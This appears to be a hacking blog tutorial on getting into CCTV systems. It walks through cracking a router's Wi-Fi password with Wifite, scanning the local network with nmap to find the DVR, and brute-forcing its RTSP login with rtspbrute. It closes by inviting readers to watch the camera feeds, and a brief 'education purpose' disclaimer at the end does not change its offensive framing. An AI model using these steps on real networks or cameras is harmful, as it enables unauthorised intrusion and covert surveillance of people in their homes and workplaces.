---
title: How to hack CCTV Cameras
author: Krish Vishwakarma
tags: [hacking, cctv]
categories: [Tutorial, Hacking]
date: 2023-12-29 14:54:00 +0530
---

## Objective

Our objective is to find vulnerability in CCTV cameras which are hosted online.

## Requirements

- Terminal/Termux
- Nmap
- Python
- rtspbrute

## Structure

![Desktop View](/assets/img/cctv-structure.png){: width="972" height="589" }
_Structure of CCTV_

The CCTV camera is connected to DVR, and DVR is connected to the router.

## Let's Go

First of all we have to connect to the router, if you don't know the password you can use 
<b>Wifite</b> or any other tool , After connecting to the router, open your terminal and install nmap using following command: 
```bash
pkg install nmap
```

After installation , our next step is to find the ip of DVR , but before we continue a few things need to be remembered:

| Service | Protocols | Port |
|---|---|---|
| TCP | TCP | 25001 |
| UDP | UDP | 25002 |
| HTTP | TCP | 80 |
| HTTPS | TCP | 443 |
| _RTSP_ | _TCP/UDP_ | _554_ |
| SNMP | UDP | 161 |
| SMTP | TCP | 25 |
| FTP | TCP | 21 |


The most important protocol is rtsp protocol this is the protocol on which the CCTV camera works.
<br> After this we need to find the IP address of DVR enter this command in your terminal:
```bash
  $ nmap 192.168.0.0/16
```

This code will scan all ip's between 192.168.0.0 to 192.168.255.255.

### Output

```
# nmap 192.168.0.0/16
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 21:00 CET
Nmap scan report for Archer.lan (192.168.0.22)
Host is up (0.0046s latency).
Not shown: 995 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
1900/tcp  open  upnp
20005/tcp open  btx
554/tcp   open  rtsp
MAC Address: 50:ff:BF:ff:ff:AC (Tp-link Technologies)

Nmap done: 1 IP address (1 host up) scanned in 5.92 seconds
```
> Read also : https://en.m.wikipedia.org/wiki/Private_network

Here we got a list of connected networks, as we can see only one network is connected i.e. 
`192.168.0.22` and it's DVR's IP address for sure.Now guess what, if we input that ip in aur browser, it'll take up to the login panel of cctv camera streaming, now the **GAME IS OVER** , we just need to bruteforce on the admin panel and then we can see camera footage with our own eyes.
## Bruteforcing Admin Panel
Now, we'll install **rtspbute** which is a bruteforcing tool for cctvs under rtsp protocol.
> See here : https://pypi.org/project/rtspbrute/

Now run the command in your terminal: `pip install rtspbrute`
### Requirements
- python (> 3.6)
- av
- Pillow
- rich

Now make a file named `hosts.txt` and write the IP address of DVR and save it, then run the following command :
```
$ rtspbrute -t hosts.txt -p 554 -d
```
-t means the target ip's in filename hosts.txt and -d means debug logs.

## Well Done
You'll get the username & password, you rocked up, now login and get the Public IP and then see everything sitting in your house. Bye Bye everyone we'll come again with more hacking tutorials, See you in the next one till then peace 🕊️.



## Warnning

This article is only for education purpose . Aim of these article is that how can secure cctv cameras using strong passwords. Do not use for criminal or another black art purpose. I am not responsible for that.